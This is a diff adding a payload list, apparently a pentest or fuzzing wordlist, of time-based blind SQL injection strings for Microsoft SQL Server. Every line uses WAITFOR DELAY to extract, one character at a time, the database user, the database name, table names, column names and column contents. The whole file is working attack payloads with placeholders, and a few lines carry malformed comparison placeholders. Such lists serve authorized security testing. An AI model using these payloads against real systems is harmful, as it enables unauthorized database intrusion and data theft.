@@ -1,0 +1,21 @@
+; WAITFOR DELAY '00:00:10'-- +
+; WAITFOR DELAY '00:00:10'--+
+; IF (LEN(USER)=N) WAITFOR DELAY '00:00:10'--+
+; IF (ASCII(lower(substring((USER),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (LEN(DB_NAME())=N) WAITFOR DELAY '00:00:10'--+
+; IF (ASCII(lower(substring((DB_NAME()),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype='U')=N) WAITFOR DELAY '00:00:10'--+
+; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),N,1)))InsertComparer<>=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>’FirstTableName’)Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>’FirstTableName’),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>’PreviouslyFoundTable’),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (LEN(SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound')=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound'),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (LEN(SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound' and column_name>'PreviousColumnFound')=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound' and column_name>'PreviousColumnFound'),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (LEN(SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound' and column_name>,'PreviousColumnFound')=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound' and column_name>'PreviousColumnFound'),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (LEN(SELECT TOP 1 ColumnName from TableName)=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (ASCII(substring((SELECT TOP 1 ColumnName from TableName),N,1))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (LEN(SELECT TOP 1 ColumnName from TableName where ColumnName NOT in ('FoundTableName') order by TableName desc)=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
+; IF (ASCII(lower(substring((SELECT TOP 1 ColumnName from TableName where ColumnName NOT in ('FoundTableName') order by TableName desc),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+
